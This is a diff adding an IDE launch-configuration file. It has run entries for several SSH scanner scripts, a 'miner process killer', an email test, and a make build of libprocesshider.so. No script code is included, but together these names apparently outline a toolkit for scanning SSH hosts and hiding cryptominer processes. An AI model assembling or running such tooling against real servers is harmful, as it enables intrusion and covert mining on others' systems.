@@ -1,0 +1,62 @@
+{
+  "version": "0.0.1",
+  "configurations": [
+    {
+      "name": "SSH Scanner (All 4 Protocols - Latest)",
+      "runtimeExecutable": "python",
+      "runtimeArgs": [
+        "LATEST-TO_USE_ssh25_09-06-25_MultipleProtocolFancyStats_gemini_ABSOLUTELY_WORKING_LIKE_BEST_DONT_REMOVE_checking_every_txt_in_dir_gemini_corrected_claude_corected_w0rking_4_all_4_protocols.py"
+      ],
+      "port": null
+    },
+    {
+      "name": "SSH Scanner (Fancy Stats - Gemini)",
+      "runtimeExecutable": "python",
+      "runtimeArgs": [
+        "LATEST-TO_USE_ssh25_09-06-25_MultipleProtocolFancyStats_gemini_ABSOLUTELY_WORKING_LIKE_BEST_DONT_REMOVE.py"
+      ],
+      "port": null
+    },
+    {
+      "name": "SSH Scanner (mmap)",
+      "runtimeExecutable": "python",
+      "runtimeArgs": [
+        "LATEST-TO_USE_ssh25_09-06-25_mmap.py"
+      ],
+      "port": null
+    },
+    {
+      "name": "SSH Scanner (Basic)",
+      "runtimeExecutable": "python",
+      "runtimeArgs": [
+        "LATEST-TO_USE_ssh25_09-06-25.py"
+      ],
+      "port": null
+    },
+    {
+      "name": "Miner Process Killer",
+      "runtimeExecutable": "python",
+      "runtimeArgs": [
+        "miner_process_kill.py"
+      ],
+      "port": null
+    },
+    {
+      "name": "Email Test (MailerSend)",
+      "runtimeExecutable": "python",
+      "runtimeArgs": [
+        "email_to_test_mailersend_net.py"
+      ],
+      "port": null
+    },
+    {
+      "name": "Build libprocesshider.so (Makefile)",
+      "runtimeExecutable": "make",
+      "runtimeArgs": [
+        "-f",
+        "Makefile_FIXED"
+      ],
+      "port": null
+    }
+  ]
+}
